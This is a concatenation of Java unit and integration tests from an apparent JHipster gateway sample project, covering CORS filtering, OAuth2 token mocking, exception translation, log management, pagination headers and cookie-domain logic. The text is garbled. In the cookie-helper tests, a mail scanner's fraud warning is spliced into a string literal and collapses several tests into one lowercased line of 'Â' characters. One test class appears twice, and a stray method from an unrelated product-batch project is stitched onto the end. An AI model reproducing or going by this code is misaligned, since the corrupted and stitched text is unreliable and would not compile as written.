        assertThat(serverOptions.getMap().get(UndertowOptions.ENABLE_HTTP2)).isTrue();
    }

    @Test
    public void testCorsFilterOnApiPath() throws Exception {
        props.getCors().setAllowedOrigins(Collections.singletonList("*"));
        props.getCors().setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE"));
        props.getCors().setAllowedHeaders(Collections.singletonList("*"));
        props.getCors().setMaxAge(1800L);
        props.getCors().setAllowCredentials(true);

        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())
            .addFilters(webConfigurer.corsFilter())
            .build();

        mockMvc.perform(
            options("/api/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com")
                .header(HttpHeaders.ACCESS_CONTROL_REQUEST_METHOD, "POST"))
            .andExpect(status().isOk())
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN, "other.domain.com"))
            .andExpect(header().string(HttpHeaders.VARY, "Origin"))
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_METHODS, "GET,POST,PUT,DELETE"))
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_CREDENTIALS, "true"))
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_MAX_AGE, "1800"));

        mockMvc.perform(
            get("/api/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com"))
            .andExpect(status().isOk())
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN, "other.domain.com"));
    }

    @Test
    public void testCorsFilterOnOtherPath() throws Exception {
        props.getCors().setAllowedOrigins(Collections.singletonList("*"));
        props.getCors().setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE"));
        props.getCors().setAllowedHeaders(Collections.singletonList("*"));
        props.getCors().setMaxAge(1800L);
        props.getCors().setAllowCredentials(true);

        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())
            .addFilters(webConfigurer.corsFilter())
            .build();

        mockMvc.perform(
            get("/test/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com"))
            .andExpect(status().isOk())
            .andExpect(header().doesNotExist(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN));
    }

    @Test
    public void testCorsFilterDeactivated() throws Exception {
        props.getCors().setAllowedOrigins(null);

        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())
            .addFilters(webConfigurer.corsFilter())
            .build();

        mockMvc.perform(
            get("/api/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com"))
            .andExpect(status().isOk())
            .andExpect(header().doesNotExist(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN));
    }

    @Test
    public void testCorsFilterDeactivated2() throws Exception {
        props.getCors().setAllowedOrigins(new ArrayList<>());

        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())
            .addFilters(webConfigurer.corsFilter())
            .build();

        mockMvc.perform(
            get("/api/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com"))
            .andExpect(status().isOk())
            .andExpect(header().doesNotExist(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN));
    }
}

 
 
 
 
package com.baeldung.jhipster.gateway.security;

import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.oauth2.common.DefaultOAuth2AccessToken;
import org.springframework.security.oauth2.provider.OAuth2Authentication;
import org.springframework.security.oauth2.provider.OAuth2Request;
import org.springframework.security.oauth2.provider.token.ResourceServerTokenServices;
import org.springframework.stereotype.Component;
import org.springframework.test.web.servlet.request.RequestPostProcessor;

import java.util.Collections;
import java.util.List;
import java.util.Set;
import java.util.UUID;
import java.util.stream.Collectors;

import static org.mockito.BDDMockito.given;

/**
 * A bean providing simple mocking of OAuth2 access tokens for security integration tests.
 */
@Component
public class OAuth2TokenMockUtil {

    @MockBean
    private ResourceServerTokenServices tokenServices;

    private OAuth2Authentication createAuthentication(String username, Set<String> scopes, Set<String> roles) {
        List<GrantedAuthority> authorities = roles.stream()
            .map(SimpleGrantedAuthority::new)
            .collect(Collectors.toList());

        User principal = new User(username, "test", true, true, true, true, authorities);
        Authentication authentication = new UsernamePasswordAuthenticationToken(principal, principal.getPassword(),
            principal.getAuthorities());

        // Create the authorization request and OAuth2Authentication object
        OAuth2Request authRequest = new OAuth2Request(null, "testClient", null, true, scopes, null, null, null,
            null);
        return new OAuth2Authentication(authRequest, authentication);
    }

    public RequestPostProcessor oauth2Authentication(String username, Set<String> scopes, Set<String> roles) {
        String uuid = String.valueOf(UUID.randomUUID());

        given(tokenServices.loadAuthentication(uuid))
            .willReturn(createAuthentication(username, scopes, roles));

        given(tokenServices.readAccessToken(uuid)).willReturn(new DefaultOAuth2AccessToken(uuid));

        return new OAuth2PostProcessor(uuid);
    }

    public RequestPostProcessor oauth2Authentication(String username, Set<String> scopes) {
        return oauth2Authentication(username, scopes, Collections.emptySet());
    }

    public RequestPostProcessor oauth2Authentication(String username) {
        return oauth2Authentication(username, Collections.emptySet());
    }

    public static class OAuth2PostProcessor implements RequestPostProcessor {

        private String token;

        public OAuth2PostProcessor(String token) {
            this.token = token;
        }

        @Override
        public MockHttpServletRequest postProcessRequest(MockHttpServletRequest mockHttpServletRequest) {
            mockHttpServletRequest.addHeader("Authorization", "Bearer " + token);

            return mockHttpServletRequest;
        }
    }
}

 
 
 
 
package com.baeldung.jhipster.gateway.web.rest.errors;

import org.springframework.dao.ConcurrencyFailureException;
import org.springframework.http.HttpStatus;
import org.springframework.security.access.AccessDeniedException;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.web.bind.annotation.*;

import javax.validation.Valid;
import javax.validation.constraints.NotNull;
import java.util.HashMap;
import java.util.Map;

@RestController
public class ExceptionTranslatorTestController {

    @GetMapping("/test/concurrency-failure")
    public void concurrencyFailure() {
        throw new ConcurrencyFailureException("test concurrency failure");
    }

    @PostMapping("/test/method-argument")
    public void methodArgument(@Valid @RequestBody TestDTO testDTO) {
    }

    @GetMapping("/test/parameterized-error")
    public void parameterizedError() {
        throw new CustomParameterizedException("test parameterized error", "param0_value", "param1_value");
    }

    @GetMapping("/test/parameterized-error2")
    public void parameterizedError2() {
        Map<String, Object> params = new HashMap<>();
        params.put("foo", "foo_value");
        params.put("bar", "bar_value");
        throw new CustomParameterizedException("test parameterized error", params);
    }

    @GetMapping("/test/missing-servlet-request-part")
    public void missingServletRequestPartException(@RequestPart String part) {
    }

    @GetMapping("/test/missing-servlet-request-parameter")
    public void missingServletRequestParameterException(@RequestParam String param) {
    }

    @GetMapping("/test/access-denied")
    public void accessdenied() {
        throw new AccessDeniedException("test access denied!");
    }

    @GetMapping("/test/unauthorized")
    public void unauthorized() {
        throw new BadCredentialsException("test authentication failed!");
    }

    @GetMapping("/test/response-status")
    public void exceptionWithReponseStatus() {
        throw new TestResponseStatusException();
    }

    @GetMapping("/test/internal-server-error")
    public void internalServerError() {
        throw new RuntimeException();
    }

    public static class TestDTO {

        @NotNull
        private String test;

        public String getTest() {
            return test;
        }

        public void setTest(String test) {
            this.test = test;
        }
    }

    @ResponseStatus(value = HttpStatus.BAD_REQUEST, reason = "test response status")
    @SuppressWarnings("serial")
    public static class TestResponseStatusException extends RuntimeException {
    }

}

 
 
 
package com.baeldung.jhipster.gateway.web.rest.errors;

import com.baeldung.jhipster.gateway.GatewayApp;
import com.baeldung.jhipster.gateway.config.SecurityBeanOverrideConfiguration;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Test class for the ExceptionTranslator controller advice.
 *
 * @see ExceptionTranslator
 */
@RunWith(SpringRunner.class)
@SpringBootTest(classes = {SecurityBeanOverrideConfiguration.class, GatewayApp.class})
public class ExceptionTranslatorIntTest {

    @Autowired
    private ExceptionTranslatorTestController controller;

    @Autowired
    private ExceptionTranslator exceptionTranslator;

    @Autowired
    private MappingJackson2HttpMessageConverter jacksonMessageConverter;

    private MockMvc mockMvc;

    @Before
    public void setup() {
        mockMvc = MockMvcBuilders.standaloneSetup(controller)
            .setControllerAdvice(exceptionTranslator)
            .setMessageConverters(jacksonMessageConverter)
            .build();
    }

    @Test
    public void testConcurrencyFailure() throws Exception {
        mockMvc.perform(get("/test/concurrency-failure"))
            .andExpect(status().isConflict())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value(ErrorConstants.ERR_CONCURRENCY_FAILURE));
    }

    @Test
    public void testMethodArgumentNotValid() throws Exception {
         mockMvc.perform(post("/test/method-argument").content("{}").contentType(MediaType.APPLICATION_JSON))
             .andExpect(status().isBadRequest())
             .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
             .andExpect(jsonPath("$.message").value(ErrorConstants.ERR_VALIDATION))
             .andExpect(jsonPath("$.fieldErrors.[0].objectName").value("testDTO"))
             .andExpect(jsonPath("$.fieldErrors.[0].field").value("test"))
             .andExpect(jsonPath("$.fieldErrors.[0].message").value("NotNull"));
    }

    @Test
    public void testParameterizedError() throws Exception {
        mockMvc.perform(get("/test/parameterized-error"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("test parameterized error"))
            .andExpect(jsonPath("$.params.param0").value("param0_value"))
            .andExpect(jsonPath("$.params.param1").value("param1_value"));
    }

    @Test
    public void testParameterizedError2() throws Exception {
        mockMvc.perform(get("/test/parameterized-error2"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("test parameterized error"))
            .andExpect(jsonPath("$.params.foo").value("foo_value"))
            .andExpect(jsonPath("$.params.bar").value("bar_value"));
    }

    @Test
    public void testMissingServletRequestPartException() throws Exception {
        mockMvc.perform(get("/test/missing-servlet-request-part"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.400"));
    }

    @Test
    public void testMissingServletRequestParameterException() throws Exception {
        mockMvc.perform(get("/test/missing-servlet-request-parameter"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.400"));
    }

    @Test
    public void testAccessDenied() throws Exception {
        mockMvc.perform(get("/test/access-denied"))
            .andExpect(status().isForbidden())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.403"))
            .andExpect(jsonPath("$.detail").value("test access denied!"));
    }

    @Test
    public void testUnauthorized() throws Exception {
        mockMvc.perform(get("/test/unauthorized"))
            .andExpect(status().isUnauthorized())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.401"))
            .andExpect(jsonPath("$.path").value("/test/unauthorized"))
            .andExpect(jsonPath("$.detail").value("test authentication failed!"));
    }

    @Test
    public void testMethodNotSupported() throws Exception {
        mockMvc.perform(post("/test/access-denied"))
            .andExpect(status().isMethodNotAllowed())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.405"))
            .andExpect(jsonPath("$.detail").value("Request method 'POST' not supported"));
    }

    @Test
    public void testExceptionWithResponseStatus() throws Exception {
        mockMvc.perform(get("/test/response-status"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.400"))
            .andExpect(jsonPath("$.title").value("test response status"));
    }

    @Test
    public void testInternalServerError() throws Exception {
        mockMvc.perform(get("/test/internal-server-error"))
            .andExpect(status().isInternalServerError())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.500"))
            .andExpect(jsonPath("$.title").value("Internal Server Error"));
    }

}

 
 
 
package com.baeldung.jhipster.gateway.web.rest;

import com.baeldung.jhipster.gateway.GatewayApp;
import com.baeldung.jhipster.gateway.config.SecurityBeanOverrideConfiguration;
import com.baeldung.jhipster.gateway.web.rest.vm.LoggerVM;
import ch.qos.logback.classic.AsyncAppender;
import ch.qos.logback.classic.LoggerContext;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.slf4j.LoggerFactory;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.put;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Test class for the LogsResource REST controller.
 *
 * @see LogsResource
 */
@RunWith(SpringRunner.class)
@SpringBootTest(classes = {SecurityBeanOverrideConfiguration.class, GatewayApp.class})
public class LogsResourceIntTest {

    private MockMvc restLogsMockMvc;

    @Before
    public void setup() {
        LogsResource logsResource = new LogsResource();
        this.restLogsMockMvc = MockMvcBuilders
            .standaloneSetup(logsResource)
            .build();
    }

    @Test
    public void getAllLogs() throws Exception {
        restLogsMockMvc.perform(get("/management/logs"))
            .andExpect(status().isOk())
            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE));
    }

    @Test
    public void changeLogs() throws Exception {
        LoggerVM logger = new LoggerVM();
        logger.setLevel("INFO");
        logger.setName("ROOT");

        restLogsMockMvc.perform(put("/management/logs")
            .contentType(TestUtil.APPLICATION_JSON_UTF8)
            .content(TestUtil.convertObjectToJsonBytes(logger)))
            .andExpect(status().isNoContent());
    }

    @Test
    public void testLogstashAppender() {
        LoggerContext context = (LoggerContext) LoggerFactory.getILoggerFactory();
        assertThat(context.getLogger("ROOT").getAppender("ASYNC_LOGSTASH")).isInstanceOf(AsyncAppender.class);
    }
}

 
 
package com.baeldung.jhipster.gateway.web.rest;

import com.baeldung.jhipster.gateway.GatewayApp;
import com.baeldung.jhipster.gateway.config.SecurityBeanOverrideConfiguration;
import com.baeldung.jhipster.gateway.web.rest.vm.LoggerVM;
import ch.qos.logback.classic.AsyncAppender;
import ch.qos.logback.classic.LoggerContext;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.slf4j.LoggerFactory;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.put;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Test class for the LogsResource REST controller.
 *
 * @see LogsResource
 */
@RunWith(SpringRunner.class)
@SpringBootTest(classes = {SecurityBeanOverrideConfiguration.class, GatewayApp.class})
public class LogsResourceIntTest {

    private MockMvc restLogsMockMvc;

    @Before
    public void setup() {
        LogsResource logsResource = new LogsResource();
        this.restLogsMockMvc = MockMvcBuilders
            .standaloneSetup(logsResource)
            .build();
    }

    @Test
    public void getAllLogs() throws Exception {
        restLogsMockMvc.perform(get("/management/logs"))
            .andExpect(status().isOk())
            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE));
    }

    @Test
    public void changeLogs() throws Exception {
        LoggerVM logger = new LoggerVM();
        logger.setLevel("INFO");
        logger.setName("ROOT");

        restLogsMockMvc.perform(put("/management/logs")
            .contentType(TestUtil.APPLICATION_JSON_UTF8)
            .content(TestUtil.convertObjectToJsonBytes(logger)))
            .andExpect(status().isNoContent());
    }

    @Test
    public void testLogstashAppender() {
        LoggerContext context = (LoggerContext) LoggerFactory.getILoggerFactory();
        assertThat(context.getLogger("ROOT").getAppender("ASYNC_LOGSTASH")).isInstanceOf(AsyncAppender.class);
    }
}

 
 
package com.baeldung.jhipster.gateway.web.rest;

import com.fasterxml.jackson.annotation.JsonInclude;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;
import org.hamcrest.Description;
import org.hamcrest.TypeSafeDiagnosingMatcher;
import org.springframework.format.datetime.standard.DateTimeFormatterRegistrar;
import org.springframework.format.support.DefaultFormattingConversionService;
import org.springframework.format.support.FormattingConversionService;
import org.springframework.http.MediaType;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.ZonedDateTime;
import java.time.format.DateTimeParseException;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Utility class for testing REST controllers.
 */
public class TestUtil {

    /** MediaType for JSON UTF8 */
    public static final MediaType APPLICATION_JSON_UTF8 = new MediaType(
            MediaType.APPLICATION_JSON.getType(),
            MediaType.APPLICATION_JSON.getSubtype(), StandardCharsets.UTF_8);

    /**
     * Convert an object to JSON byte array.
     *
     * @param object
     *            the object to convert
     * @return the JSON byte array
     * @throws IOException
     */
    public static byte[] convertObjectToJsonBytes(Object object)
            throws IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.setSerializationInclusion(JsonInclude.Include.NON_EMPTY);

        JavaTimeModule module = new JavaTimeModule();
        mapper.registerModule(module);

        return mapper.writeValueAsBytes(object);
    }

    /**
     * Create a byte array with a specific size filled with specified data.
     *
     * @param size the size of the byte array
     * @param data the data to put in the byte array
     * @return the JSON byte array
     */
    public static byte[] createByteArray(int size, String data) {
        byte[] byteArray = new byte[size];
        for (int i = 0; i < size; i++) {
            byteArray[i] = Byte.parseByte(data, 2);
        }
        return byteArray;
    }

    /**
     * A matcher that tests that the examined string represents the same instant as the reference datetime.
     */
    public static class ZonedDateTimeMatcher extends TypeSafeDiagnosingMatcher<String> {

        private final ZonedDateTime date;

        public ZonedDateTimeMatcher(ZonedDateTime date) {
            this.date = date;
        }

        @Override
        protected boolean matchesSafely(String item, Description mismatchDescription) {
            try {
                if (!date.isEqual(ZonedDateTime.parse(item))) {
                    mismatchDescription.appendText("was ").appendValue(item);
                    return false;
                }
                return true;
            } catch (DateTimeParseException e) {
                mismatchDescription.appendText("was ").appendValue(item)
                    .appendText(", which could not be parsed as a ZonedDateTime");
                return false;
            }

        }

        @Override
        public void describeTo(Description description) {
            description.appendText("a String representing the same Instant as ").appendValue(date);
        }
    }

    /**
     * Creates a matcher that matches when the examined string reprensents the same instant as the reference datetime
     * @param date the reference datetime against which the examined string is checked
     */
    public static ZonedDateTimeMatcher sameInstant(ZonedDateTime date) {
        return new ZonedDateTimeMatcher(date);
    }

    /**
     * Verifies the equals/hashcode contract on the domain object.
     */
    public static <T> void equalsVerifier(Class<T> clazz) throws Exception {
        T domainObject1 = clazz.getConstructor().newInstance();
        assertThat(domainObject1.toString()).isNotNull();
        assertThat(domainObject1).isEqualTo(domainObject1);
        assertThat(domainObject1.hashCode()).isEqualTo(domainObject1.hashCode());
        // Test with an instance of another class
        Object testOtherObject = new Object();
        assertThat(domainObject1).isNotEqualTo(testOtherObject);
        assertThat(domainObject1).isNotEqualTo(null);
        // Test with an instance of the same class
        T domainObject2 = clazz.getConstructor().newInstance();
        assertThat(domainObject1).isNotEqualTo(domainObject2);
        // HashCodes are equals because the objects are not persisted yet
        assertThat(domainObject1.hashCode()).isEqualTo(domainObject2.hashCode());
    }

    /**
     * Create a FormattingConversionService which use ISO date format, instead of the localized one.
     * @return the FormattingConversionService
     */
    public static FormattingConversionService createFormattingConversionService() {
        DefaultFormattingConversionService dfcs = new DefaultFormattingConversionService ();
        DateTimeFormatterRegistrar registrar = new DateTimeFormatterRegistrar();
        registrar.setUseIsoFormat(true);
        registrar.registerFormatters(dfcs);
        return dfcs;
    }
}

 
 
package com.baeldung.jhipster.gateway.web.rest.util;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;

import java.util.ArrayList;
import java.util.List;

import org.junit.Test;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.PageImpl;
import org.springframework.data.domain.PageRequest;
import org.springframework.http.HttpHeaders;

/**
 * Tests based on parsing algorithm in app/components/util/pagination-util.service.js
 *
 * @see PaginationUtil
 */
public class PaginationUtilUnitTest {

    @Test
    public void generatePaginationHttpHeadersTest() {
        String baseUrl = "/api/_search/example";
        List<String> content = new ArrayList<>();
        Page<String> page = new PageImpl<>(content, PageRequest.of(6, 50), 400L);
        HttpHeaders headers = PaginationUtil.generatePaginationHttpHeaders(page, baseUrl);
        List<String> strHeaders = headers.get(HttpHeaders.LINK);
        assertNotNull(strHeaders);
        assertTrue(strHeaders.size() == 1);
        String headerData = strHeaders.get(0);
        assertTrue(headerData.split(",").length == 4);
        String expectedData = "</api/_search/example?page=7&size=50>; rel=\"next\","
                + "</api/_search/example?page=5&size=50>; rel=\"prev\","
                + "</api/_search/example?page=7&size=50>; rel=\"last\","
                + "</api/_search/example?page=0&size=50>; rel=\"first\"";
        assertEquals(expectedData, headerData);
        List<String> xTotalCountHeaders = headers.get("X-Total-Count");
        assertTrue(xTotalCountHeaders.size() == 1);
        assertTrue(Long.valueOf(xTotalCountHeaders.get(0)).equals(400L));
    }

}

 
package com.baeldung.jhipster.gateway.security.oauth2;

import com.baeldung.jhipster.gateway.config.oauth2.OAuth2Properties;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.test.util.ReflectionTestUtils;

/**
 * Tests helper functions around OAuth2 Cookies.
 *
 * @see OAuth2CookieHelper
 */
public class OAuth2CookieHelperTest {
    public static final String GET_COOKIE_DOMAIN_METHOD = "getCookieDomain";
    private OAuth2Properties oAuth2Properties;
    private OAuth2CookieHelper cookieHelper;

    @Before
    public void setUp() throws NoSuchMethodException {
        oAuth2Properties = new OAuth2Properties();
        cookieHelper = new OAuth2CookieHelper(oAuth2Properties);
    }

    @Test
    public void testLocalhostDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("localhost");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);
    }

    @Test
    public void testComDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("test.com");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);        //already top-level domain
    }

    @Test
    public void testWwwDomainCom() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("MailScanner has detected a possible fraud attempt from "www.test.com");ÂÂÂÂÂÂÂstringname=reflectiontestutils.invokemethod(cookiehelper,get_cookie_domain_method,request);ÂÂÂÂÂÂÂassert.assertnull(name);ÂÂÂ}ÂÂÂ@testÂÂÂpublicvoidtestcomsubdomain(){ÂÂÂÂÂÂÂmockhttpservletrequestrequest=newmockhttpservletrequest();ÂÂÂÂÂÂÂrequest.setservername("abc.test.com");ÂÂÂÂÂÂÂstringname=reflectiontestutils.invokemethod(cookiehelper,get_cookie_domain_method,request);ÂÂÂÂÂÂÂassert.assertequals(".test.com",name);ÂÂÂ}ÂÂÂ@testÂÂÂpublicvoidtestwwwsubdomaincom(){ÂÂÂÂÂÂÂmockhttpservletrequestrequest=newmockhttpservletrequest();ÂÂÂÂÂÂÂrequest.setservername("www.abc.test.com");ÂÂÂÂÂÂÂstringname=reflectiontestutils.invokemethod(cookiehelper,get_cookie_domain_method,request);ÂÂÂÂÂÂÂassert.assertequals(".test.com",name);ÂÂÂ}ÂÂÂ@testÂÂÂpublicvoidtestcoukdomain(){ÂÂÂÂÂÂÂmockhttpservletrequestrequest=newmockhttpservletrequest();ÂÂÂÂÂÂÂrequest.setservername("test.co.uk");ÂÂÂÂÂÂÂstringname=reflectiontestutils.invokemethod(cookiehelper,get_cookie_domain_method,request);ÂÂÂÂÂÂÂassert.assertnull(name);ÂÂÂÂÂÂÂÂÂÂÂ" claiming to be www.test.com");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);
    }

    @Test
    public void testComSubDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("abc.test.com");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertEquals(".test.com", name);
    }

    @Test
    public void testWwwSubDomainCom() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("www.abc.test.com");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertEquals(".test.com", name);
    }


    @Test
    public void testCoUkDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("test.co.uk");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);            //already top-level domain
    }

    @Test
    public void testCoUkSubDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("abc.test.co.uk");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertEquals(".test.co.uk", name);
    }

    @Test
    public void testNestedDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("abc.xyu.test.co.uk");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertEquals(".test.co.uk", name);
    }

    @Test
    public void testIpAddress() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("127.0.0.1");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);
    }
}


	@Test
    public void test_send_ProductsBatchRequest_Operation() throws Exception {
        final ProductsBatchController productsBatchController = mock(ProductsBatchController.class);
        final String expectedBatchDescriptorAsJson =
                "{\n" +
                        "  \"reportId\": \"123\",\n" +
                        "  \"locale\": \"de_DE\",\n" +
                        "  \"kind\": \"PRODUCTS_BATCH\",\n" +
                        "  \"mode\": \"DRY_RUN\"\n" +
                        "}";

        final List<Request> addRequestList = this.buildAddRequest(5);
        final List<Request> deleteRequestList = this.buildDeleteRequest(0);
        final List<Request> updateRequestList = this.buildUpdateRequest(4);
        final List<Request> allRequests = buildRequest(addRequestList, deleteRequestList, updateRequestList);

        final BatchRequestExt request = new BatchRequestExt(
                DEFAULT_LOCALE,
                BatchKind.PRODUCTS_BATCH,
                BatchMode.DRY_RUN,
                allRequests,
                DEFAULT_REPORT_ID);

        final BatchDescriptor expected = this.getBatchDescriptor(expectedBatchDescriptorAsJson);
        final URI uri = this.buildURI("https://localhost:8093", "/google-shopping/products/batches");
        final RequestEntity<BatchRequestExt> requestEntity = new RequestEntity<>(request, HttpMethod.POST, uri);

        final MultiValueMap<String, String> headers = new LinkedMultiValueMap<>();
        headers.add(HttpHeaders.CONTENT_TYPE, MediaType.APPLICATION_JSON_VALUE);

        when(productsBatchController.start(any(BatchRequestExt.class))).thenReturn(expected);
        when(this.restTemplate.exchange(requestEntity, BatchDescriptor.class)).thenReturn(new ResponseEntity(expected, headers, HttpStatus.OK));

        final ResponseEntity<BatchDescriptor> response = this.restTemplate.exchange(requestEntity, BatchDescriptor.class);
        assertThat(response, is(not(nullValue())));

        final BatchDescriptor descriptor = response.getBody();
        assertThat(descriptor, is(not(nullValue())));
        assertThat(descriptor.getLocale(), IsEqual.equalTo(DEFAULT_LOCALE));
        assertThat(descriptor.getKind(), IsEqual.equalTo(BatchKind.PRODUCTS_BATCH));
        assertThat(descriptor.getMode(), IsEqual.equalTo(BatchMode.DRY_RUN));
        assertThat(descriptor.getReportId(), IsEqual.equalTo(DEFAULT_REPORT_ID));
        assertThat(descriptor.getStart(), is(nullValue()));
        assertThat(descriptor.getFinish(), is(nullValue()));

        final HttpHeaders responseHeaders = response.getHeaders();
        assertThat(responseHeaders, is(not(nullValue())));
        assertThat(responseHeaders.getContentType(), IsEqual.equalTo(MediaType.APPLICATION_JSON_UTF8));

        verify(productsBatchController).start(ArgumentMatchers.eq(request));
        verify(productsBatchController, only()).start(request);
        verify(productsBatchController).start(this.batchRequestExtArgumentCaptor.capture());

        final BatchRequestExt capturedArgument = this.batchRequestExtArgumentCaptor.getValue();
        assertThat(capturedArgument, is(not(nullValue())));
        assertThat(capturedArgument, IsEqual.equalTo(requestEntity));

        verifyNoMoreInteractions(productsBatchController);
    }

 
 
